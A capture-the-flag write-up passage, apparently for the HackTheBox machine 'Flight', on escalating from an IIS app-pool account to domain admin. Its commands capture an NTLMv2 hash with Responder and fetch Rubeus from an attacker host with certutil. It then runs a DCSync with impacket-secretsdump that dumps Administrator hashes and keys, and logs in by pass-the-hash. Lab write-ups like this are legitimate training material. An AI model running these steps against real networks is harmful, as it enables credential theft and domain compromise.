
iis apppool\defaultapppool is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. For example, if I start responder and then try to open an SMB share on it (net use \\10.10.15.9\test), the account I see trying to authenticate is flight\G0$:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:1e589bf41238cf8e:547002306786919B6BB28F45BC6EEA4F:010100000000000080ADD9B1DBEAD801A1870276D7F4D729000000000200080052004F003500320001001E00570049004E002D00450046004B004A004B0059004500500037003900500004003400570049004E002D00450046004B004A004B005900450050003700390050002E0052004F00350032002E004C004F00430041004C000300140052004F00350032002E004C004F00430041004C000500140052004F00350032002E004C004F00430041004C000700080080ADD9B1DBEAD80106000400020000000800300030000000000000000000000000300000B1315E28BC96528147F3929B329DC4FE9D27ADEB96DF3BCF9F6C892CCB4443D80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

I won’t be able to crack that NetNTLMv2 because the machine accounts use long random passwords. But it does show that the defaultapppool account is authenticating as the machine account.

---
## Get Ticket

Since this account can talk to the domain and uses the domain controller’s machine account to do so, getting this account’s Kerberos Ticket (TGT) will allow us to perform a DCSync. Rubeus lets us acquire the TGT easily.

Transfered "Rubeus" onto target system.

```
certutil -urlcache -split -f http://10.10.15.9/Rubeus.exe Rubeus.exe
```

Ran it to gain Ticket

```
Rubeus.exe tgtdeleg /nowrap
```

Save Output in ticket.kirbi.base64

---
## DCSync Attack

Decode the ticket.

```
cat ticket.kirbi.base64| base64 -d ticket.kirbi
```

Convert it to the format needed by my Linux System:

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

export it Kerberos Variable

```
export KRB5CCNAME=ticket.ccache 
```

Trying to Dump Domain Hashes out of memory.

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
```

Clock skew error??

```
impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```

Connected to target system.

```
impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```